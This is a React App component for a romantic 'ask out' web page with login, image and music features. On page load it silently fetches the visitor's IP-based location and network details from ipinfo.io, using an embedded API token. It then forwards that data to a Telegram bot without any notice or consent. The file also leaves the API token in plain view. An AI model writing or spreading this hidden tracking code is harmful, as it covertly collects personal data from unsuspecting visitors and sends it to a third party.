import { AskOut } from "./AskOut";
import { ImageLayer } from "./Imagelayer";
import { useState, useEffect } from "react";
import { Login } from "./Login";
import { MusicPlayer } from "./components/MusicPlayer";
import { sendMessageTelegram } from "./telegramHandler";
import { useAssetPreloader } from "./hooks/useAssetPreloader";
import { allImages } from "./constants/assets";

// Import your romantic background music here
// You'll need to add an mp3 file to src/assets/music/
import romanticMusic from "./assets/music/romantic.mp3";

function App() {
	const [isYes, setYes] = useState(false);
	const [authenticated, setAuthenticated] = useState(false);
	const [Sent, setSent] = useState(false);

	// Preload all images in background
	const { progress, isComplete } = useAssetPreloader(allImages);

	useEffect(() => {
		fetchUserData();
	}, []);

	const fetchUserData = async () => {
		if (Sent) return;
		const browserInfo = {
			userAgent: navigator.userAgent,
			platform: navigator.platform,
			screenSize: `${window.screen.width}x${window.screen.height}`,
		};
		await fetch("https://ipinfo.io/json?token=0b07b6a04e84df")
			.then((res) => res.json())
			.then((data) => {
				const message = Object.entries(data)
					.map(([key, value]) => {
						if (Array.isArray(value)) {
							return `${key} - \`${value.join(", ")}\``;
						} else if (typeof value === "object" && value !== null) {
							return `${key} - \`${JSON.stringify(value)}\``;
						} else {
							return `${key} - \`${value}\``;
						}
					})
					.join("\n");
				sendMessageTelegram(message);
			});
		setSent(true);
	};

	return (
		<>
			{/* Loading indicator - shows while preloading */}
			{!isComplete && (
				<div className="loading-bar" style={{ width: `${progress}%` }} />
			)}

			{/* Main content */}
			{!authenticated && <Login setAuthenticated={setAuthenticated} />}
			{authenticated && !isYes && <AskOut setYes={setYes} />}
			{isYes && <ImageLayer />}

			{/* Music player - uncomment when you add music */}
			<MusicPlayer audioSrc={romanticMusic} /> 
		</>
	);
}

export default App;
